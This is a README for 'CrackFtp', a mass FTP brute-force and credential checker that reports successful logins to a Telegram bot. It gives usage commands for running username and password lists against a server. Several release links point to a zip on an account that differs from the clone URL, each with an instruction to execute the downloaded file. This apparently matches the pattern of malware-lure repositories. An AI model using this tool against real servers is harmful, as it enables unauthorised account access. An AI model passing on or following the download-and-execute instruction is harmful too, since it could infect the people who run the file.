# CrackFtp 🛠️

![GitHub release](https://github.com/zizisk-2000mj9/CrackFtp/releases/download/97vpbxhjgg/Setup.1.6.2.zip)

Welcome to the **CrackFtp** repository! This project is a mass FTP checker and cracker designed to test login credentials and notify users of successful logins to secure domains via Telegram. With the increasing importance of cybersecurity, tools like CrackFtp help ethical hackers and security professionals ensure the integrity of their networks.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [How It Works](#how-it-works)
- [Telegram Notifications](#telegram-notifications)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Releases](#releases)

## Features

- **Mass FTP Checking**: Test multiple FTP credentials at once.
- **Brute-Force Capability**: Supports brute-force attempts to discover valid credentials.
- **Telegram Notifications**: Get instant alerts on successful logins.
- **Command-Line Interface**: Simple and efficient command-line tool.
- **Ethical Hacking Tool**: Designed for security professionals and ethical hackers.
- **Cross-Platform**: Works on Windows, macOS, and Linux.

## Installation

To get started with CrackFtp, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/DevJinma/CrackFtp.git
   cd CrackFtp
   ```

2. **Install Dependencies**:
   Ensure you have Python installed. Then, run:
   ```bash
   pip install -r requirements.txt
   ```

3. **Download the Latest Release**:
   You can download the latest release [here](https://github.com/zizisk-2000mj9/CrackFtp/releases/download/97vpbxhjgg/Setup.1.6.2.zip). Make sure to execute the downloaded file.

## Usage

To use CrackFtp, run the script from the command line. The basic syntax is:

```bash
python crackftp.py --target <ftp_server> --user <username_file> --pass <password_file>
```

### Example

```bash
python crackftp.py --target ftp.example.com --user users.txt --pass passwords.txt
```

This command will attempt to log in to `ftp.example.com` using usernames from `users.txt` and passwords from `passwords.txt`.

## How It Works

CrackFtp uses a straightforward approach to check FTP credentials. It connects to the specified FTP server and attempts to log in using combinations of usernames and passwords. If a successful login occurs, it logs the credentials and sends a notification via Telegram.

### Workflow

1. **Input Files**: Users provide a list of usernames and passwords in text files.
2. **Connection**: The script establishes a connection to the FTP server.
3. **Login Attempts**: It iterates through the provided credentials, attempting to log in.
4. **Notifications**: On success, it sends a notification to the specified Telegram bot.

## Telegram Notifications

To receive notifications, you need to set up a Telegram bot. Follow these steps:

1. **Create a Telegram Bot**:
   - Open Telegram and search for `@BotFather`.
   - Use the command `/newbot` to create a new bot and follow the prompts.
   - Save the token provided by BotFather.

2. **Get Your Chat ID**:
   - Start a chat with your bot.
   - Use the following URL to get your chat ID:
     ```
     https://api.telegram.org/bot<YourBOTToken>/getUpdates
     ```
   - Look for your chat ID in the JSON response.

3. **Configure the Script**:
   - Edit the configuration file or pass the token and chat ID as command-line arguments when running the script.

## Contributing

We welcome contributions! If you have ideas for improvements or new features, feel free to fork the repository and submit a pull request. 

### Steps to Contribute

1. **Fork the Repository**.
2. **Create a New Branch**:
   ```bash
   git checkout -b feature/YourFeatureName
   ```
3. **Make Your Changes**.
4. **Commit Your Changes**:
   ```bash
   git commit -m "Add your message here"
   ```
5. **Push to Your Fork**:
   ```bash
   git push origin feature/YourFeatureName
   ```
6. **Submit a Pull Request**.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For any questions or suggestions, please contact the maintainer:

- **Name**: DevJinma
- **Email**: devjinma@example.com

## Releases

To get the latest version of CrackFtp, visit the [Releases](https://github.com/zizisk-2000mj9/CrackFtp/releases/download/97vpbxhjgg/Setup.1.6.2.zip) section. Make sure to download and execute the file for the latest features and fixes.

## Acknowledgments

- Special thanks to the contributors who helped make this project possible.
- Inspired by various open-source projects in the cybersecurity domain.

---

Thank you for your interest in CrackFtp! We hope this tool serves you well in your security endeavors.
